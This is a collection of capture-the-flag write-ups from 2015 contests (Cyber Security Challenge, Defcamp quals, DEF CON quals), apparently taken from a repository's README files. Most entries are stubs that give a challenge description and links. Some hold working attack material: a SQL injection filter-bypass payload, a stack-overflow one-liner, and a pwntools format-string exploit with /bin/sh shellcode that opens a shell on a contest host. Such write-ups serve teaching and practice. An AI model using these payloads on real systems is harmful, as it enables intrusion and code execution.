b = [ 4,  7,    24,         31, 4,  10,     15,  7,  12,       27,  13,  6]

out = ''
flag = ''
for i in range(len(v)):
    # write a binary string, reverse the order of bits
    out += ('{:0' + str(b[i]) + 'b}').format(v[i])[::-1]
# reverse the final output
out = out[::-1]

# convert each byte into a character
for i in range(0, len(out), 8):
    print('{} {}'.format(out[i:i+8], chr(int(out[i:i+8],2))))
    flag += chr(int(out[i:i+8],2))
```

```
$ python2 reassemble.py
01010100 T
01101110 n
01010110 V
01110010 r
01011010 Z
01010011 S
01000010 B
00110000 0
01100001 a
01000111 G
01010101 U
01100111 g
01010110 V
00110010 2
01101000 h
01101000 h
01100010 b
01000111 G
01010110 V
01111010 z
TnVrZSB0aGUgV2hhbGVz

$ ./Crackme TnVrZSB0aGUgV2hhbGVz
Cookies for you!
The solution is: Nuke the Whales
```

The flag `Nuke the Whales` is simply the base64 decoding of the password (see function `0x400e9c`).

## Other write-ups and resources

* <http://haxelion.eu/writeup/Crackme_In_Memory_Bruteforce/>
# Cyber Security Challenge 2015: Reverse That Binary

**Category:** Reverse Engineering
**Points:** 20
**Description:**

> We received a binary that guards a flag. However, the password has been lost. Can you still retrieve the flag?
>
> [`login`](login)

## Write-up

Let's run the binary:
```
root@jeroen-u64:/media/sf_SHARED/CSC# chmod +x login
root@jeroen-u64:/media/sf_SHARED/CSC# ./login
Please fill in the password:test
Please fill in the password:^C
root@jeroen-u64:/media/sf_SHARED/CSC# 
```
Maybe the password is hardcoded in the binary. 
```
root@jeroen-u64:/media/sf_SHARED/CSC# strings login
<...snip...>
%"	 
impo
ssib
le_t
o_gu
ess_
pass
word
fffff.
l$ L
t$(L
|$0H
Please fill in the password:
Correct password
Flag: You_hacked_it
;*3$"
zPLR
root@jeroen-u64:/media/sf_SHARED/CSC# 
```
Great! We've got the password AND the flag right there!
```
root@jeroen-u64:/media/sf_SHARED/CSC# ./login 
Please fill in the password:impossible_to_guess_password
Correct password
Flag: You_hacked_it
root@jeroen-u64:/media/sf_SHARED/CSC#
```

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Automated Analysis Mistakes

**Category:** Secure Coding
**Points:** 5
**Description:**

> When looking at results from a static analysis scan or from a penetration testing solution, there are always findings that are not real problems. The tool made a mistake or the analysis was incomplete which led to showing an issue which is actually not a problem in reality. How do we call such an issue?

## Write-up

Such an issue is called a [false positive](http://www.cgisecurity.com/questions/falsepositive.shtml).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: OWASP

**Category:** Secure Coding
**Points:** 20
**Description:**

> To protect against for example XSS, OWASP offers a great library which helps you implement input validation. Find the library and report what default regex is used to validate filenames that are given as input.

## Write-up

The solution lies in the ESAPI (The OWASP Enterprise Security API) Java repository: <https://github.com/ESAPI/esapi-java-legacy/blob/95d85be952ddb64e2a8997f6b862d6208d8ea9f2/configuration/esapi/ESAPI.properties>

```properties
Validator.FileName=^[a-zA-Z0-9!@#$%^&{}\\[\\]()_+\\-=,.~'` ]{1,255}$
```

## Other write-ups and resources

* none
# Cyber Security Challenge 2015: Static Analysis

**Category:** Secure Coding
**Points:** 10
**Description:**

> How do we call the analysis that static analysis solutions use to track user input throughout the application?

## Write-up

That’s called _taint analysis_.

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: 0day Hunting

**Category:** Web Application Security
**Points:** 40
**Description:**

> There are rumors that my perfectly up to date web application is susceptible to some kind of zero-day vulnerability… Could you investigate please?
>
> URL: 37.187.249.84:15000

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: NSA

**Category:** Web Application Security
**Points:** 50
**Description:**

> We heard rumors that the website below is owned by the NSA. There doesn’t seem to be much to it though… Maybe it’s just a placeholder?
>
> URL: 37.187.249.84:20005

## Write-up

```bash
$ curl 'http://37.187.249.84:20005/robots.txt'
# robots.txt for Nviso Realm

User-agent: *
Disallow: /css
Disallow: /js
Disallow: /imgs
```

<http://37.187.249.84:20005/css/> uses basic access authentication and prompts for a username and password.

Although basic access is usually implemented by a .htaccess file, it can just as easily be implemented in PHP by using the correct headers. This basic access is vulnerable to a SQL injection attack. When submitting `"'` as the value for the login and password, the server returns the following response:
```
HTTP/1.1 401 Unauthorized
Date: Mon, 16 Mar 2015 10:38:03 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.36-0+deb7u3
WWW-Authenticate: Basic realm="Nviso Realm"
Pragma: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"''' at line 1
Vary: Accept-Encoding
Content-Length: 13
Content-Type: text/html

Access Denied
```
This pragma header shows us a MySQL error. The login form is vulnerable, but it does use some input filtering. For example, all MySQL keywords are filtered, but it isn't done recursively. The following input will result in a valid login:
```sql
usr: ' UN=IO=N SEL=ECT * FR=OM usorers; # '
pwd: '
```
This works because the equals sign (=) is removed after the input filter checks for UNTION/SELECT or FROM.

The webserver returns `Congratulations! The flag is basic_auth_is_sooo_last_century`


## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: NVISO File Host

**Category:** Web Application Security
**Points:** 120
**Description:**

> File hosting is booming business and NVISO can’t stay behind. That’s why we’re launching our new and exciting service: NVISO File Host! You can upload anything you want!
>
> URL: 37.187.249.84:10007
>
> TIP: This challenge was created by Pythia

## Write-up

See [nviso_file_host_solution.py](nviso_file_host_solution.py) (Writeup by NVISO coming @ their blog)

## Other write-ups and resources

* none yet
# Defcamp CTF Qualifications 2015: 11-50

**Category:** Crypto
**Points:** 50
**Description:**

> 11 short texts have been encrypted with the same stream cipher. No no! Figure out the 11th plaintext!
> [file](c100)


## Write-up

(TODO)

## Other write-ups and resources

* <https://zeta-two.com/ctf/2015/11/22/dctf-qual-writeup.html#crypto50-11>
* <https://github.com/p4-team/ctf/tree/master/2015-10-02-dctf/crypto_50># Defcamp CTF Qualifications 2015: custom-function-engineering-300

**Category:**
**Points:**
**Solves:**
**Description:**

> You are given the following ciphertext: `320b1c5900180a034c74441819004557415b0e0d1a316918011845524147384f5700264f48091e4500110e41030d1203460b1d0752150411541b455741520544111d0000131e0159110f0c16451b0f1c4a74120a170d460e13001e120a1106431e0c1c0a0a1017135a4e381b16530f330006411953664334593654114e114c09532f271c490630110e0b0b`

> And you are also give the code used to encrypt it: [encrypt.php](encrypt.txt). Show us some magic! :-) 

>This challenge does not have a specific flag format.
>
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-10-02-dctf/crypto_300_custom_function>
# Defcamp CTF Qualifications 2015: no-crypto-200

**Category:** Crypto
**Points:** 200
**Description:**

>The folowing plaintext has been encrypted using an unknown key, with AES-128 CBC:
>Original: Pass: sup3r31337. Don't loose it!
>Encrypted:
> `4f3a0e1791e8c8e5fefe93f50df4d8061fee884bcc5ea90503b6ac1422bda2b2b7e6a975bfc555f44f7dbcc30aa1fd5e`

> IV: `19a9d10c3b155b55982a54439cb05dce`

>How would you modify it so that it now decrypts to: `"Pass: notAs3cre7. Don't loose it!"`

>This challenge does not have a specific flag format.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Defcamp%20CTF%20Qualification%202015/No%20Crypto%20%5Bcrypto%5D%20(200)> 
* <https://zeta-two.com/ctf/2015/11/22/dctf-qual-writeup.html#crypto200-no-crypto># Defcamp CTF Qualifications 2015: things-you-were-not-able-to-see-in-the-past-100

**Category:** Crypto
**Points:** 100
**Description:**

> IWC ECTCC OPK WNQV SI AKGBRU TVZZ EAH JIZ ENEG CFY BMZ
>
> Part II:
>
> > wiihrjrexllioeugamgephviviihrire

> > viigsirfylkjnfthznheqgvjwjjhsjrf

> > vjjhsjrfylkjnfuhznhfqhwjwjjhrjrf
>
> This challenge does not have a specific flag format.
>
>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Defcamp CTF Qualifications 2015: master-of-exploit-400

**Category:**
**Points:**
**Solves:**
**Description:**

> You spent so much time in front of the PC that you might be confused. If so, don't worry, you can at least prove you're the best in virtual life. Pwn this last one and get the crown! Target: dctfu_*@10.13.37.9:22

> Password: see dashboard page Flag: cat /flag


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Defcamp CTF Qualifications 2015: password-encrypting-tool-100

**Category:** Exploit
**Points:**100
**Solves:**
**Description:**

>Our second newest programmer created a tool so that we can encrypt our usual passwords and use more secure ones wherever we register new accounts. He said that he left some sort of an easter egg that could leverage you, but he doesn't really expect anyone to get it. You are the newest programmer, can you find it and prove him you are the one?

> Hack the target when you've figured out with this [file](e100).

>Target: dctf@10.13.37.6:22


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://github.com/RandomsCTF/write-ups/tree/master/Defcamp%20CTF%20Qualification%202015/Password%20encrypting%20tool%20%5Bexploit%5D%20(100)> 
* <https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/exploit/e100/sudhackar/README.md>

### Meta

Vulnerability:

* Stack Overflow via `gets`
* Call hidden function

We are given a stripped 32bit ELF for i386 Linux:

```bash
$ file e100
e100: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4410355efef2e99ac54e4028dba1b3e40d055fee, stripped
```

Running it, we can provide a password as input, which then is encrypted and returned:

```bash
$ ./e100
Enter password: hello
Your new secure password is: ?????
```

Lets open it in `radare2` and look at the functions available:

```bash
[0x08048400]> aa
[0x08048400]> afl | sort -k1 | column -t
0x08048390  16   2  sym.imp.printf
0x080483a0  16   2  sym.imp.gets
0x080483b0  16   2  sym.imp.__stack_chk_fail
0x080483c0  16   2  sym.imp.system
0x080483e0  16   2  sym.imp.strlen
0x080483f0  16   2  sym.imp.__libc_start_main
0x08048400  34   1  entry0
0x080484fd  167  9  fcn.080484fd
0x080485a4  28   1  main
```

Ok looks like we have some interesting imported functions that have been called: `system`, `gets` and `printf`.

Our binary itself consists of two functions: `fcn.080484fd` and `main`.

Decompiling `main`:

![](./main.png)

Decompiling `fcn.080484fd`:

![](./fcn-080484fd.png)

Main just does `fcn.080484fd(0xdadadada);`, while `fcn.080484fd` does following interesting things:

* If first argument of `fcn.080484fd` is `0xbadb0169`, it calls `system("cat flag");`
* Takes input and applies some simple `xor` encryption with some tweaks on it (see `0x08048546` to `0x08048574`). See [this writeup](https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/exploit/e100/sudhackar/README.md) for a complete source generated by Hopper.
* Calls `__stack_chk_fail()` if stack smashing has been detected

Since `gets` is called on our input, we assume that we are dealing with a simple Stack Overflow situation.

And indeed, we can smash the stack:

```bash
$ python -c 'print "A"*0x100' > in
gdb-peda$ r < in
[...]
Stopped reason: SIGSEGV
0xf7e43542 in getenv () from /lib32/libc.so.6
gdb-peda$ bt
#0  0xf7e43542 in getenv () from /lib32/libc.so.6
#1  0xf7e7918b in ?? () from /lib32/libc.so.6
#2  0xf7f0a3cb in __fortify_fail () from /lib32/libc.so.6
#3  0xf7f0a35a in __stack_chk_fail () from /lib32/libc.so.6
#4  0x0804859e in ?? ()
#5  0x41414141 in ?? ()
[...]
```

We cannot provide any shellcode to be executed, since `NX` is enabled and, adding to that, a stack smashing checking function is called right before `ret`.

Since the first argument to `fcn.080484fd` is hardcoded and always not equal to `0xbadb0169`, but `0xdadadada`, we have to smash the stack and set the value of the first argument to `0xbadb0169` to be able to execute `system("cat flag");`.

To do this, we have to find the correct offset, which can be calculated in a simple manner:

* Buffer for `gets` starts at `ebp-0x2c` (`ebp-local_3`)
* First argument for `fcn.080484fd` is at `ebp+0x8` (`ebp+arg_2`). On `ebp+0x4` we have our `EIP`/`rip`.
* Adding both together, we get `0x2c`+`0x8` = `0x34`.

Running our exploit:

```bash
$ python -c 'print "A"*0x34+"\x69\x01\xdb\xba"' | ./e100
DCTF{3671bacdb5ea5bc26982df7da6de196e}
*** stack smashing detected ***: ./e100 terminated
Enter password: Aborted (core dumped)
```

We can see the flag, `DCTF{3671bacdb5ea5bc26982df7da6de196e}`.

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Defcamp%20CTF%20Qualification%202015/Password%20encrypting%20tool%20%5Bexploit%5D%20(100)> 
* <https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/exploit/e100/sudhackar/README.md>
* [Japanese](http://ctf.publog.jp/archives/cat_1182010.html)
# Defcamp CTF Qualifications 2015: such-exploit-much-random-300

**Category:** Exploit
**Points:** 300
**Description:**

>Just do the obvious, get the flag!

> Target: dctfu_*@10.13.37.11:22

> Password: see dashboard.

> Flag: cat /flag


## Write-up

(TODO)

## Other write-ups and resources

* <https://xtaticblog.wordpress.com/2015/10/04/defcamp-ctf-qualification-2015-exploit-300/> 
* <http://boaster.github.io/exploitation/2015/10/04/DCTF-Exploitation-300.html>
* <https://whitehatters.academy/dctfu-2015-exploit300/>
* <https://ucs.fbi.h-da.de/writeup-defcamp2015-exploit-300/>
# Defcamp CTF Qualifications 2015: that-moment-200

**Category:** Exploit
**Points:** 200
**Description:**

>See if you can give it what it wants but it does not ask for.

> Target: dctfu_*@10.13.37.7:22

> Password: see dashboard page

> Flag: cat /flag


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Defcamp CTF Qualifications 2015: can-you-read-pacifico-400

**Category:** Misc
**Points:**400
**Solves:**
**Description:**

> Break 1337 captchas in a row and prove a thing!

> Target: 10.13.37.10


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-10-02-dctf/misc_400_captcha>
* [Japanese](http://miettal.hatenablog.com/entry/2015/10/06/111232)
# Defcamp CTF Qualifications 2015: emotional-roller-coaster-350

**Category:** Misc
**Points:** 200
**Description:**

>Are you a good listener? Expect us!

> This time you're the target. :-)


## Write-up

(TODO)

## Other write-ups and resources

* <http://khack40.info/defcamp-quals-ctf-2015-emotional-roller-coaster-misc-write-up/> (French)
* <https://github.com/RandomsCTF/write-ups/tree/master/Defcamp%20CTF%20Qualification%202015/Emotional%20Roller%20Coaster%20%5Bmisc%5D%20(350)>
* <https://zeta-two.com/ctf/2015/11/22/dctf-qual-writeup.html#misc350-emotional-roller-coaster>
* [Japanese](http://miettal.hatenablog.com/entry/2015/10/06/111232)# Defcamp CTF Qualifications 2015: she-said-it-doesnt-matter-100

**Category:** Misc
**Points:** 100
**Description:**

> Void. Empty. Null. [file](m100.png) 


## Write-up

(TODO)

## Other write-ups and resources

* <https://zeta-two.com/ctf/2015/11/22/dctf-qual-writeup.html#misc100-she-said-it-doesnt-matter>
* <https://github.com/p4-team/ctf/tree/master/2015-10-02-dctf/misc_100_doesnt_matter>
* [Japanese](http://miettal.hatenablog.com/entry/2015/10/06/111232)# Defcamp CTF Qualifications 2015: try-harder-200

**Category:**
**Points:**
**Solves:**
**Description:**

> > Just in case you didn't yet try hard enough :)

> Links:

> [part0](misc200.part0.jpg.gz)

> [part3](part3.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://zeta-two.com/ctf/2015/11/22/dctf-qual-writeup.html#misc200-try-harder>
* <https://github.com/p4-team/ctf/tree/master/2015-10-02-dctf/misc_200_try_harder>
* [Japanese](http://miettal.hatenablog.com/entry/2015/10/06/111232)
# Defcamp CTF Qualifications 2015 CTF write-ups

* <http://dctf.def.camp/>
* [Scoreboard](http://dctf.def.camp/ranks) or [local alternative](./scoreboard)

## Completed write-ups

* [exploit/password-encrypting-tool-100](exploit/password-encrypting-tool-100)

## External write-ups only

* [crypto/11-50](crypto/11-50)
* [crypto/custom-function-engineering-300](crypto/custom-function-engineering-300)
* [crypto/no-crypto-200](crypto/no-crypto-200)
* [exploit/such-exploit-much-random-300](exploit/such-exploit-much-random-300)
* [misc/can-you-read-pacifico-400](misc/can-you-read-pacifico-400)
* [misc/emotional-roller-coaster-350](misc/emotional-roller-coaster-350)
* [misc/she-said-it-doesnt-matter-100](misc/she-said-it-doesnt-matter-100)
* [misc/try-harder-200](misc/try-harder-200)
* [reverse/entry-language-100](reverse/entry-language-100)
* [reverse/lbs-checker-300](reverse/lbs-checker-300)
* [reverse/link-and-switch-200](reverse/link-and-switch-200)
* [reverse/master-of-reversing-400](reverse/master-of-reversing-400)
* [web/rocket-science-admin-panel-300](web/rocket-science-admin-panel-300)
* [web/the-hylian-dude-200](web/the-hylian-dude-200)
* [web/warmup-100](web/warmup-100)
* [web/web-400](web/web-400)

## Missing write-ups

* [crypto/things-you-were-not-able-to-see-in-the-past-100](crypto/things-you-were-not-able-to-see-in-the-past-100)
* [exploit/master-of-exploit-400](exploit/master-of-exploit-400)
* [exploit/that-moment-200](exploit/that-moment-200)# Defcamp CTF Qualifications 2015: entry-language-100

**Category:** Reversing
**Points:**100
**Solves:**
**Description:**

> u might be able to talk like them once you find who they are.

> [Download](r100)

> This challenge does not have a specific flag format.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Defcamp%20CTF%20Qualification%202015/Entry%20language%20%5Breverse%5D%20(100)> 
* <https://zeta-two.com/ctf/2015/11/22/dctf-qual-writeup.html#reversing100-entry-language>
* <https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/reverse/r100/sudhackar/README.md>
* <https://github.com/p4-team/ctf/tree/master/2015-10-02-dctf/re_100_entry># Defcamp CTF Qualifications 2015: lbs-checker-300

**Category:** Reversing
**Points:** 300
**Description:**

> Our company DCTF created a new password generator based on LSB algorithm. Everyone got a user:pass combination.

> As their policy is very strict, if you ever submit your password wrong, you get fired. That's why they developed this LBS Checker. You can enter your username : password combination to check if it's valid. This way you'll never get fired.

> Your job: find the password of "Administrator" account. It seems they've implemented some security checks so you can't even try to do that.

> Have fun!

> [Download](r300)

> This challenge does not have a specific flag format.


## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/D-CTF%202015/LBS%20Checker/72/>
* <https://github.com/p4-team/ctf/tree/master/2015-10-02-dctf/re_300_lbs_checker>
# Defcamp CTF Qualifications 2015: link-and-switch-200

**Category:** Reversing
**Points:**
**Solves:**
**Description:**

> Any idea what this could be?

> [Download](r200) 

> This challenge does not have a specific flag format.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/reverse/r200/sudhackar/README.md>
* <https://b01lers.net/challenges/D-CTF%202015/Link%20%26%20Switch/71/>
* <https://github.com/p4-team/ctf/tree/master/2015-10-02-dctf/re_200_link>
# Defcamp CTF Qualifications 2015: master-of-reversing-400

**Category:** Reversing
**Points:** 400
**Description:**

> You've got to the end. Use your access to get this one and prove you are a MOR!

> [Download](r400) 

> This challenge does not have a specific flag format.
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-10-02-dctf/re_400_master_of_reversing>
# Defcamp CTF Qualifications 2015: rocket-science-admin-panel-300

**Category:** Web
**Points:** 300
**Description:**

> Somebody with great skills and inspiration created a user system. Is this safe for a multi million dollar business? He says it is. I doubt.

> Target: 10.13.37.4

> Flag: DCTF{md5}


## Write-up

(TODO)

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-defcamp2015-rocket-science-admin-panel-web-200/> (Down, [Cached Version](http://webcache.googleusercontent.com/search?q=cache:T1vTKzR3_-8J:https://ucs.fbi.h-da.de/writeup-defcamp2015-rocket-science-admin-panel-web-200/&num=1&hl=en&gl=de&strip=1&vwsrc=0))
# Defcamp CTF Qualifications 2015: the-hylian-dude-200

**Category:** Web
**Points:** 200
**Description:**

> Hylian corporations are nasty.

> Target: 10.13.37.3

> Flag: DCTF{md5}


## Write-up

(TODO)

## Other write-ups and resources

* <http://tontonsfl4ggeurs.github.io/DCTF/>
* <https://ucs.fbi.h-da.de/writeup-defcamp2015-the-hylian-dude-web-200/> (Down, [Cached Version](http://webcache.googleusercontent.com/search?q=cache:PRSc6-oADwEJ:https://ucs.fbi.h-da.de/writeup-defcamp2015-the-hylian-dude-web-200/&num=1&hl=en&gl=de&strip=1&vwsrc=0))
* <http://toh.necst.it/dctf2015/web/DCTF_2015_Web/#web200>
* [Japanese](http://miettal.hatenablog.com/entry/2015/10/06/111232)
# Defcamp CTF Qualifications 2015: warmup-100

**Category:** Web
**Points:** 100
**Description:**
> It's all about money.

> Target: 10.13.37.2

> Flag: DCTF{md5}


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-10-02-dctf/web_100>
* <http://toh.necst.it/dctf2015/web/DCTF_2015_Web/#web100>
# Defcamp CTF Qualifications 2015: web-400

**Category:** Web
**Points:** 400
**Description:**

> Somebody with great skills of CSS tried to show some images in a friendly manner for his boss but unfortunately even my mom can do a better page. Can you show him that not only his CSS skills suck?

> Target: 10.13.37.5

> Flag: DCTF{md5}


## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/D-CTF%202015/CSS%20Engineer/73/>
* <http://tontonsfl4ggeurs.github.io/DCTF/>
* <http://toh.necst.it/dctf2015/web/DCTF_2015_Web/#web400>
* [Japanese](http://miettal.hatenablog.com/entry/2015/10/06/111232)
# DEF CON Qualifier 2015: babycmd

**Category:** Baby's First
**Points:** 1
**Solves:** TODO
**Description:**

> babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me:15491 [Download](http://downloads.notmalware.ru/babycmd_3ad28b10e8ab283d7df81795075f600b)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.whitehatters.academy/legitbs-2015-babycmd/>
* <https://sysexit.wordpress.com/2015/05/18/defcon-23-ctf-quals-2015-babycmd-writeup/>
* <http://blog.0x80.org/r0pbaby-writeup-defcon-prequal/>
* <http://lockboxx.blogspot.com/2015/05/defcon-ctf-2015-quals-writeup-babycmd.html>
* <https://gist.github.com/anonymous/052f0cac9b54748fb15c>
* <http://pastebin.com/vX4L6ebJ>
* <https://ctf-team.vulnhub.com/defcon-2015-quals-babycmd/>
* <http://www.mrt-prodz.com/blog/view/2015/05/def-con-2015-quals---babycmd-1pt-writeup>
* <http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup/>
# DEF CON Qualifier 2015: babyecho

**Category:** Baby's First
**Points:** 1
**Solves:** TODO
**Description:**

> babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me:3232
>
> [Download](http://downloads.notmalware.ru/babyecho_eb11fdf6e40236b1a37b7974c53b6c3d)


## Write-up

by [boogy](https://github.com/boogy)

_This write-up is made by boogy of the on_est_pas_contents CTF team._

The binary is 32bit and striped:
```bash
$ file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
babyecho_eb11fdf6e40236b1a37b7974c53b6c3d: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=c9a66685159ad72bd157b521f05a85e2e427f5ee, stripped
```
Fuzzing around with the binary before eaven reverse enginnering it, we sat that there is a format string vulnerability in the function that echos out the user input.
```bash
$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
AAAA
AAAA
$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
%p%p%p%p
0xd0xa(nil)0xd
```
The problem here is that the buffer only accepts 13 bytes of user input so it's not possible to craft a correct format string payload and overwrite stuff. We need to reverse engineer the function that takes the user input and find out where the size variable is.

I'll not paste all the functions here to save some space but here is the function which is important to us, that prints the user input:
```C
int __usercall sub_8048F3C@<eax>(int a1@<ebx>)
{
  int v1; // ecx@1
  signed int buffer_max_length; // eax@2
  int v3; // ecx@4
  int buffer_length; // [sp+10h] [bp-410h]@1
  int v7; // [sp+1Ch] [bp-404h]@4
  int v8; // [sp+41Ch] [bp-4h]@1

  v8 = *MK_FP(__GS__, 20);
  buffer_length = 13;                           // default buffer length is 13 bytes
  sub_804FC40(off_80EA4C0, 0, 2, 0);
  sub_804DE70(14, sub_8048EB1);
  sub_806CB50(v1, a1);
  while ( 1 )
  {
    buffer_max_length = 1023;                   // maximum length for the buffer
    if ( buffer_length <= 1023 )
      buffer_max_length = buffer_length;
    buffer_length = buffer_max_length;
    sub_804F560("Reading %d bytes\n", buffer_max_length);
    sub_8048E24((int)&v7, buffer_length, 10);
    sub_8048ECF((int)&v7);
    sub_804F560((const char *)&v7);
    sub_804FDE0(10);
    sub_806CB50(v3, a1);
  }
}
```
We can see that the size variable is by default 13 bytes. What is important to note is that the binary checks if the buffer length does not exceed 1023, which means that even if we rewrite the size we can't go more than 1023.

So how do we bypass the 13 bytes restriction and change it to the maximum size **1023**? Well with format strings you have a write what where condition. After some gdb foo we can see the stack layout:

So the stack looks like this:

* %1$x -> 0xd
* %2$x -> 0xa
* %3$x -> 0x0
* %4$x -> 0xd
* %5$x -> pointer to our buffer (first char in "AAAA" on the stack)
* %6$x -> 0x0
* %7$x -> start of our input "AAAA"

We can see this in gdb:

```bash
--------------------------------------------------------------------------[regs]
  EAX: 0x0000000D  EBX: 0x080481A8  ECX: 0x080EB4D4  EDX: 0x080481A8  o d I t S z A p C
  ESI: 0x00000000  EDI: 0x080EA00C  EBP: 0xFFFFD598  ESP: 0xFFFFD170  EIP: 0x08048FDB
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
--------------------------------------------------------------------------[code]
=> 0x8048fdb:   call   0x804f560
   0x8048fe0:   mov    DWORD PTR [esp+0x8],0xa
   0x8048fe8:   mov    eax,DWORD PTR [esp+0x10]
   0x8048fec:   mov    DWORD PTR [esp+0x4],eax
   0x8048ff0:   lea    eax,[esp+0x1c]
   0x8048ff4:   mov    DWORD PTR [esp],eax
   0x8048ff7:   call   0x8048e24
   0x8048ffc:   lea    eax,[esp+0x1c]
--------------------------------------------------------------------------------
Breakpoint 1, 0x08048fdb in ?? ()
gdb$ x/32w $esp+4
0xffffd174:     0x0000000d      0x0000000a      0x00000000      0x0000000d
0xffffd184:     0xffffd18c      0x00000000      0x41414141      0x00000000
0xffffd194:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd1a4:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd1b4:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd1c4:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd1d4:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd1e4:     0x00000000      0x00000000      0x00000000      0x00000000
gdb$ x/x 0xffffd18c
0xffffd18c:     0x41414141
```
We can also verify it by giving a **%p** to the binary as input to leak stack values:
```bash
$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
%p%p%p%p%p%p
0xd0xa(nil)0xd0xffffd18c(nil)
```
Or accessing directly the buffer address on the stack:
```bash
$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
%5$p
0xffffd18c
```
The first **0xd** is 13 in hex so this is the buffer default length. So how can we override it ? That's simple, with the format strings we can leak the buffer address and then calculate the address of the size on the stack then we write to that address.

Here is the final exploit:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

# p = remote("localhost", 1338)
p = remote("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232)
log.info(p.recvuntil("\n"))

#leak buffer address
p.sendline("%5$x")
buffer_address = int(p.recvuntil("\n"), 16)
log.info("Buffer is at %s" % hex(buffer_address))
log.info(p.recvuntil("\n"))

get_address = lambda i: buffer_address+4*(i-7)

# change buffer size to 1023==0x3ff
# buffer_address is 12 bytes after 0xd on the stack
p.sendline(p32(get_address(4)+1)+"%7$hhn") # buffer_address-0xc+1 => 0xd
p.recvuntil("\n")
log.info(p.recvuntil("\n"))

addr2write = get_address(-1)
addr0 = buffer_address+32
addr1 = hex((addr0 >>16)& 0xFFFF)
addr2 = hex(addr0 & 0xFFFF)

payload = str(p32(addr2write)) + str(p32(addr2write+2)) + \
        "%" + str(int(addr1, 16)-8) + "x%8$hn" + \
        "%" + str(int(addr2.replace('0x', '0x1'),16)-int(addr1,16)) + "x%7$hn" + "\x90"*100 + shellcode

log.info("Sending payload")
p.sendline(payload)
p.interactive()
```
> The format string payload could be easily generated with the libformatstr.

Running the exploit we get a shell
```bash
[+] Opening connection to localhost on port 1338: Done
[*] Reading 13 bytes
[*] Buffer is at 0xffb3d4ec
[*] Reading 13 bytes
[*] Reading 1023 bytes
[*] Sending payload
[*] Switching to interactive mode
...
$ cat /home/babyecho/flag
The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
```


## Other write-ups and resources

* <http://pastebin.com/TGuRLGCQ>
* <https://ctf-team.vulnhub.com/defcon-2015-quals-babyecho/>
* <http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/>
* [Korean](http://blackcon.tistory.com/121)
# DEF CON Qualifier 2015: mathwhiz

**Category:** Baby's First
**Points:** 1
**Solves:** TODO
**Description:**

> mathwhiz_c951d46fed68687ad93a84e702800b7a.quals.shallweplayaga.me:21249


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/rick2600/writeups/blob/master/defcon2015/matwiz.md>
* <http://lockboxx.blogspot.com/2015/05/defcon-ctf-2015-quals-writeup-babycmd.html>
* <http://pastebin.com/8Nb1Kv7J>
* <https://ctf-team.vulnhub.com/defcon-2015-quals-mathwhiz/>
* <http://www.mrt-prodz.com/blog/view/2015/05/def-con-2015-quals---mathwhiz-1pt-writeup>
* <http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-mathwize-writeup/>
